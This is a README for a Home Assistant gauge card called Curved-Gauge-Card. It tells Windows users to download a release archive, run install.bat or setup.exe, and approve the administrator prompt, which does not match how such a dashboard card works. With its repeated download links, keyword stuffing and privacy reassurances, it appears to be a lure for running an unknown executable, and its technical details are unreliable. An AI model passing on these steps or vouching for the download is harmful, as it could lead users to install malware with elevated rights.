<h1>📊 Curved-Gauge-Card - Beautiful Gauges for Your Smart Home Dashboard</h1>

<p align="center">
  <a href="https://github.com/Wsa2689/Curved-Gauge-Card/releases"><img src="https://img.shields.io/badge/⬇️DOWNLOAD-Curved_Gauge_Card-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2E7D32" alt="Download Badge"></a>
</p>

## ✨ What Is This?

Curved-Gauge-Card is a free, customizable gauge widget for your Home Assistant dashboard. It turns boring numbers into beautiful, colorful, curved dials that show temperature, humidity, energy usage, speed, or any other measurement you track at home. Instead of reading plain text, you get a visual speedometer-style display that updates in real time.

Think of it like adding a car dashboard to your phone or computer screen—only it shows what's happening in your house. You can see at a glance whether your living room is too hot, your freezer is at the right temperature, or how much power your solar panels are generating right now.

## 🚀 Getting Started

Follow these simple steps to get Curved-Gauge-Card working on your Windows computer. No programming skills needed.

### 📥 Step 1: Download the File

<a href="https://github.com/Wsa2689/Curved-Gauge-Card/releases">Click here to visit the download page</a>. Look for the latest release and download the file.

Visit this link to download the application. The download page shows a list of versions. Always pick the newest one on top. Save the file somewhere easy to find, like your Desktop or Downloads folder.

### 📂 Step 2: Extract the File

Once the download finishes, you should see a folder or icon on your screen. Right-click on it and choose "Extract All" or "Extract Here" from the menu. Windows will ask where you want to save the extracted files. Pick a new folder named "Curved-Gauge-Card" and click "Extract." This only takes a few seconds.

### ▶️ Step 3: Run the Installation

Open the folder you just created. Inside, you'll see a file called `install.bat` or `setup.exe`. Double-click it. Windows might show a blue or yellow pop-up asking "Do you want to allow this app to make changes?"—click "Yes." The installation will run automatically. You'll see a black window with white text (like an old computer screen). This is normal. Wait until the text stops moving and says "Press any key to continue" or similar. Press any key, and the window closes.

### 🏠 Step 4: Connect to Your Home Assistant

After installation, open your Home Assistant in a web browser. The program automatically copies the gauge files into the right folder. If you already have Home Assistant running, refresh the page. If not, start it first. You should now see "Curved-Gauge-Card" available in your list of cards.

### 🔧 Step 5: Add the Gauge to Your Dashboard

Go to your dashboard, click the three dots in the top-right corner, and choose "Edit Dashboard." Then click "Add Card" and search for "Curved Gauge." Select it. A blank gauge appears. Click the pencil icon to open settings. Type in the name of any sensor you have (like `temperature.living_room`), choose colors and a style, and press "Save." Your gauge is now live.

## 🎨 Understanding the Settings

The gauge card gives you many ways to make it look just right:

- **Entity**: This is the sensor you want to display. Click the dropdown and pick from your available sensors.
- **Minimum and Maximum**: Set the lowest and highest number the gauge should show. If your temperature ranges from 0 to 40 degrees, type "0" and "40." The gauge automatically divides this into segments.
- **Color Zones**: You can make the gauge change colors as it approaches different values. For example, set it to green from 0–20, yellow from 20–30, and red from 30–40. This helps you see warnings immediately.
- **Needle Style**: Choose between a classic needle, a modern line, or no needle at all.
- **Size**: Adjust the width and height to fit your screen. You can make it small in a corner or large in the center.
- **Label**: Add a text label below the gauge, like "Living Room Temp," so you remember what it shows.
- **Tick Marks**: Decide whether you want small lines around the outside of the gauge for precise reading or keep it clean and minimal.

## 🖼️ Examples of What You Can Build

- A thermostat gauge in the living room section showing current temperature and color-coded to turn red when it's too hot.
- A humidity gauge in the bathroom that changes to blue when it's damp.
- An energy consumption gauge on your main dashboard showing electricity usage spikes in bright orange.
- A pool water temperature gauge that only matters in summer, so you hide it in winter.
- Multiple small gauges in a row for every room of your house, all drawn on one screen.

## 🛠️ Customizing Further (Optional)

If you later want to change the exact look (like making the background dark or light, changing the font, or adjusting line thickness), you can edit a simple text file inside the extracted folder. Open the folder named "src," find a file called `curved-gauge-card.js`, and look for lines that start with `const`. Change numbers and colors there. Save the file, then re-run the install file from Step 3. This is only for people who want extra control—the main settings menu covers most needs.

## ❓ Troubleshooting Tips

**The gauge doesn't appear after install.**
- Close and reopen your Home Assistant web page completely. Sometimes the browser caches old files.
- Check that your Home Assistant is version 2023.1 or newer. Older versions might not support custom cards.

**The needle doesn't move.**
- Double-check the entity name you typed. Go to Developer Tools in Home Assistant, click "States," and find the exact spelling. Copy-paste it into the gauge settings.
- Ensure the sensor returns a number, not text. If your sensor says "Unavailable," fix the sensor itself first.

**The colors look wrong.**
- Make sure the minimum and maximum values you set actually match your sensor's typical range. If you set max at 100 but your temperature never goes above 25, the gauge will look mostly green and tiny.
- Try adjusting the "Cluster" or "Gradient" setting in the style options to switch between flat colors per zone or smooth blending.

**The card is too big or small.**
- Use the size slider in the settings. Alternatively, hold the "Ctrl" key and press "+" or "-" on your keyboard to zoom the whole browser page.

**Nothing works after a Home Assistant update.**
- Re-download the latest Curved-Gauge-Card from the link above and re-run the install file. Updates sometimes change internal name references.

## 📅 Frequently Asked Questions

**Is this free?**
Yes, completely free. You can use it as much as you want, at home or for commercial projects.

**Do I need to understand code?**
No. The installation and main settings are entirely visual. Even the optional advanced customization only requires changing simple numbers like "10" to "20."

**Will it work on a tablet or phone?**
Yes, it works on any device with a web browser. It automatically adjusts to touch controls and different screen sizes.

**Does it drain my computer's battery?**
No, it's very lightweight. It only updates the numbers when your sensors send new data, which is typically every few seconds. The graphics are simple and efficient.

**Can I have more than one gauge?**
Absolutely. Add as many as you want by clicking "Add Card" and choosing Curved Gauge each time. Each one holds its own independent settings.

**What if my sensor reports unusual values (like "nan")?**
The gauge will show "—" and stop moving. This is normal and tells you the sensor has a problem. Once the sensor reports a valid number, the gauge resumes working.

## 🔄 Updating the Software

Periodically, the developer releases new versions with extra features or bug fixes. To update, simply visit the same download link, grab the latest release, extract it, and run the install file again. Your existing settings will be preserved, so no need to redo anything.

## 📝 Privacy and Security

This card runs entirely on your own computer and connects only to your Home Assistant server. No data ever leaves your house. The code is open source, meaning anyone can inspect it for safety. There are no ads, no trackers, and no account creation required.

## 📞 Getting Help

If you run into issues not covered here, the best place to ask is the GitHub discussion page. Search for similar problems first, as someone else might have already found an answer. Include a screenshot of the problem and tell people the version of Curved-Gauge-Card you downloaded. The community is friendly and responsive, typically answering within 24 hours.

The same page also has a "Report an Issue" button for genuine bugs. Provide steps to reproduce the problem, and the developer will fix it in the next release.

## 💡 Thank You

You've just turned your Home Assistant into a much more visual and enjoyable experience. With a few clicks, you've added professional-looking gauges that make your data instantly understandable. Share screenshots of your dashboard with friends or in online forums—gauge cards always impress.

Remember: the download link is always your friend. <a href="https://github.com/Wsa2689/Curved-Gauge-Card/releases">Visit the release page</a> anytime you need to reinstall, update, or check for new versions. Happy monitoring!

Keywords: curved gauge card, home assistant dashboard, custom card, visualization, sensor card, gauge widget, smart home UI, temperature gauge, humidity dial, energy meter card, open source, HACS, YAML free setup